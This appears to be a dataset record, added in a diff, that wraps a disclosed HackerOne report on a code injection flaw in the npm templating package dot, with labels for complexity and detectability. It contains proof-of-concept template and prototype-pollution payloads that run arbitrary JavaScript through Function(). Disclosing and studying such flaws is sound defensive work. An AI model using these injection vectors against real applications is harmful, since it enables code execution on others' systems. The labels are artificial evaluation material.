@@ -1,0 +1,46 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "cris_semmle ",
+    "title": "Code Injection Vulnerability in dot Package",
+    "content": "\nI would like to report a code injection vulnerability in dot.\nIt allows attackers to execute arbitrary JS code, especially when combined with a prototype pollution attack.\nModule\nmodule name: dot\nversion: 1.1.2\nnpm page: https://www.npmjs.com/package/dot\nModule Description\nCreated in search of the fastest and concise JavaScript templating function with emphasis on performance under V8 and nodejs. It shows great performance for both nodejs and browsers.\ndoT.js is fast, small and has no dependencies.\nModule Stats\n76,838 downloads in the last week\nVulnerability\nVulnerability Description\ndot uses Function() to compile templates. this can be exploited by the attacker if she can control the template or if she can control the value set on Object.prototype.\nSteps To Reproduce:\na) The basic attack vector\nCode 131 Bytes\n1var doT = require(\"dot\");\n2var tempFn = doT.template(\"<h1>Here is a sample template \" +\n3    \"{{=console.log(23)}}</h1>\");\n4tempFn({})\nb) in combination with a prototype pollution attack\ncreate a folder \"resources\" and inside that a file called \"mytemplate.dot\" with the following content:\nCode 34 Bytes\n1<h1>Here is a sample template</h1>\nin the folder containing the resources folder, create and execute the following js file\nCode 267 Bytes\n1var doT = require(\"dot\");\n2// prototype pollution attack vector\n3Object.prototype.templateSettings = {varname:\"a,b,c,d,x=console.log(25)\"};\n4// benign looking template compilation + application\n5var dots = require(\"dot\").process({path: \"./resources\"});\n6dots.mytemplate();\nEven though the template compilation + application looks safe, due to the prototype pollution, the attacker can execute arbitrary commands.\nPatch\nN/A remove Function() call\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nThe attacker can achieve code injection/RCE if she can control the template or if she can set arbitrary properties on Object.prototype. Using Function() with runtime computed values is rarely safe.\n\n",
+    "severity": [
+        7.4,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Code Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1554300960,
+    "report_url": "https://hackerone.com/reports/390929",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "MEDIUM",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "var doT = require(\"dot\");"
+        ],
+        [
+            2,
+            "var tempFn = doT.template(\"<h1>Here is a sample template \" + \"{{=console.log(23)}}</h1>\");"
+        ],
+        [
+            3,
+            "tempFn({})"
+        ]
+    ],
+    "vuln_description": "The vulnerability in the dot package allows for code injection through template compilation using Function(), which can be exploited to execute arbitrary JavaScript code. This is particularly dangerous when combined with prototype pollution, as it can lead to remote code execution.",
+    "reason": "The attack involves understanding the template compilation process in the dot package and how prototype pollution can be leveraged to inject malicious code. The interaction between these components is non-obvious and requires knowledge of JavaScript's prototype chain and the specific implementation details of the dot package.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The vulnerability involves code injection via template manipulation, which is not directly related to authentication or authorization boundaries. The proposed methodologies focus on testing access control by swapping user sessions and resource IDs, not on detecting code execution vulnerabilities in template engines.",
+        "is_detectable": false
+    }
+}
